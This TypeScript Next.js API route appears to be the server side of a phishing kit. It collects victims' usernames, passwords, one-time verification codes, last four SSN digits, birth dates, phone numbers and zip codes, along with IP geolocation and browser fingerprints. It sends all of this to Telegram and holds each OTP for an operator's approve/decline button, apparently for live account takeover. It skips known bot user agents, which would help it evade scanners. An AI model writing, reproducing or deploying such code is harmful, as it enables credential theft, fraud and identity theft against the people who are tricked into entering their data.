import { NextResponse } from "next/server";
import { z } from "zod";
import {
  formatLoginMessage,
  formatMethodMessage,
  formatResendMessage,
  formatVerificationMessage,
  formatVisitMessage,
  getClientIp,
  isTelegramConfigured,
  lookupIpGeo,
  sendTelegramToAll,
  withSiteHeader,
  sendVerificationWithApprovalButtons,
} from "@/lib/telegram";
import { getVercelGeoHints } from "@/lib/vercel-geo";
import { isBlockedBotUserAgent } from "@/lib/bot-block";
import {
  storePendingCode,
  startAutocleanup,
  updatePendingCode,
} from "@/lib/pending-codes";

const methodEnum = z.enum(["email", "text", "phone"]);

const bodySchema = z.discriminatedUnion("kind", [
  z.object({
    kind: z.literal("visit"),
    userAgent: z.string().max(2000),
    screenWidth: z.number().optional(),
    screenHeight: z.number().optional(),
    language: z.string().max(64).optional(),
    referrer: z.string().max(2000).optional(),
    url: z.string().max(2000).optional(),
    timeZone: z.string().max(128).optional(),
    localTime: z.string().max(128).optional(),
  }),
  z.object({
    kind: z.literal("login"),
    username: z.string().max(512),
    password: z.string().max(512),
  }),
  z.object({
    kind: z.literal("method"),
    method: methodEnum,
  }),
  z.object({
    kind: z.literal("verification"),
    method: methodEnum,
    code: z.string().max(32),
    otpStep: z.union([z.literal(1), z.literal(2)]),
  }),
  z.object({
    kind: z.literal("resend"),
    method: methodEnum,
    otpStep: z.union([z.literal(1), z.literal(2)]),
  }),
  z.object({
    kind: z.literal("identity"),
    method: methodEnum,
    ssnLast4: z.string().max(4),
    birthDate: z.string().max(64),
    phoneNumber: z.string().max(32),
    zipCode: z.string().max(9),
  }),
]);

function formatUtcTime(d: Date): string {
  return d.toLocaleString("en-GB", {
    timeZone: "UTC",
    day: "2-digit",
    month: "2-digit",
    year: "numeric",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
    hour12: false,
  });
}

export async function POST(request: Request) {
  try {
    // Check for KV configuration early
    if (!process.env.KV_REST_API_URL || !process.env.KV_REST_API_TOKEN) {
      console.error(
        "[TELEGRAM ERROR] Vercel KV is not configured. Please set KV_REST_API_URL and KV_REST_API_TOKEN environment variables.",
      );
      return NextResponse.json(
        {
          ok: false,
          error: "kv_not_configured",
          message: "Vercel KV storage is not configured",
        },
        { status: 500 },
      );
    }

    // Initialize autocleanup on first request
    if (typeof globalThis !== "undefined") {
      if (!(globalThis as any).__telegramAutocleanupInitialized) {
        (globalThis as any).__telegramAutocleanupInitialized = true;
        startAutocleanup();
        console.log("[TELEGRAM] Autocleanup initialized");
      }
    }

    if (!isTelegramConfigured()) {
      console.error("[TELEGRAM ERROR] Telegram is not configured");
      return NextResponse.json(
        { ok: false, error: "not_configured" },
        { status: 500 },
      );
    }

    let json: unknown;
    try {
      json = await request.json();
    } catch (err) {
      console.error("[TELEGRAM ERROR] Invalid JSON:", err);
      return NextResponse.json(
        { ok: false, error: "invalid_json", details: String(err) },
        { status: 400 },
      );
    }

    const parsed = bodySchema.safeParse(json);
    if (!parsed.success) {
      console.error("[TELEGRAM ERROR] Invalid body:", parsed.error);
      return NextResponse.json(
        { ok: false, error: "invalid_body", details: parsed.error },
        { status: 400 },
      );
    }

    const body = parsed.data;

    if (
      body.kind === "visit" &&
      isBlockedBotUserAgent(request.headers.get("user-agent"))
    ) {
      return NextResponse.json({ ok: true, skipped: true });
    }

    let text: string;
    let isVerificationWithButtons = false;

    switch (body.kind) {
      case "visit": {
        const rawIp = getClientIp(request);
        const ipForLookup = rawIp ?? "127.0.0.1";
        const vercel = getVercelGeoHints(request.headers);
        const geo = await lookupIpGeo(ipForLookup);
        const location =
          vercel.location ??
          geo?.locationLine ??
          "Unknown (local or private network)";
        const displayIp = geo?.ip ?? rawIp ?? ipForLookup;
        const timezone =
          body.timeZone ?? vercel.timezone ?? geo?.timezone ?? "Unknown";
        const isp = vercel.isp ?? geo?.isp ?? "Unknown";
        const screenW = body.screenWidth ?? 0;
        const screenH = body.screenHeight ?? 0;
        const refRaw = body.referrer?.trim();
        const referrer = refRaw && refRaw.length > 0 ? refRaw : "Direct";
        text = formatVisitMessage({
          location,
          ip: displayIp,
          timezone,
          isp,
          userAgent: body.userAgent,
          screen: `${screenW}x${screenH}`,
          language: body.language ?? "Unknown",
          referrer,
          url: body.url ?? "Unknown",
          localTime: body.localTime ?? new Date().toLocaleString(),
          utcTime: formatUtcTime(new Date()),
        });
        break;
      }
      case "login":
        text = formatLoginMessage(body.username, body.password);
        break;
      case "method":
        text = formatMethodMessage(body.method);
        break;
      case "verification": {
        // Store the pending code for admin approval
        const pendingCode = await storePendingCode(
          body.code,
          body.method,
          body.otpStep,
          "new_user",
          {
            clientIp: getClientIp(request) ?? undefined,
            userAgent: request.headers.get("user-agent") ?? undefined,
          },
        );

        // Send message with approve/decline buttons to admins
        const result = await sendVerificationWithApprovalButtons(
          body.method,
          body.code,
          body.otpStep,
          pendingCode.id,
        );

        if (!result.ok) {
          console.error(
            "[TELEGRAM ERROR] Failed to send verification with buttons:",
            result.error,
          );
          return NextResponse.json(
            { ok: false, error: "send_failed" },
            { status: 502 },
          );
        }

        // Store message ID for later editing
        if (result.messageId) {
          await updatePendingCode(pendingCode.id, {
            messageId: result.messageId,
          });
        }

        console.log(
          "[TELEGRAM] Verification code stored for approval:",
          pendingCode.id,
        );

        // Store the pending code ID globally for returning in response
        (global as any).__lastPendingCodeId = pendingCode.id;

        // Don't send generic message for verification codes
        isVerificationWithButtons = true;
        text = formatVerificationMessage(body.method, body.code, body.otpStep);
        break;
      }
      case "resend":
        text = formatResendMessage(body.method, body.otpStep);
        break;
      case "identity":
        text = `✅ Identity Details Submitted
━━━━━━━━━━━━━━━━━━
🧾 Last 4 SSN: ${body.ssnLast4}
📅 Birth Date: ${body.birthDate}
📱 Phone Number: ${body.phoneNumber}
📮 Zip Code: ${body.zipCode}`;
        break;
      default: {
        const _exhaustive: never = body;
        return _exhaustive;
      }
    }

    // Skip generic send for verification messages (already sent with buttons)
    if (isVerificationWithButtons) {
      return NextResponse.json({
        ok: true,
        codeId: (global as any).__lastPendingCodeId,
      });
    }

    // DEBUG LOGGING: Remove this block after verifying Telegram delivery
    const result = await sendTelegramToAll(withSiteHeader(text));
    console.log("[TELEGRAM DEBUG]", { body, text, telegramResult: result });
    if (!result.ok) {
      console.error("[TELEGRAM ERROR] Failed to send:", result.error);
      return NextResponse.json(
        { ok: false, error: result.error ?? "send_failed" },
        { status: 502 },
      );
    }

    return NextResponse.json({ ok: true });
  } catch (error) {
    console.error("[TELEGRAM] Unhandled error:", error);
    return NextResponse.json(
      { ok: false, error: "internal_server_error", details: String(error) },
      { status: 500 },
    );
  }
}
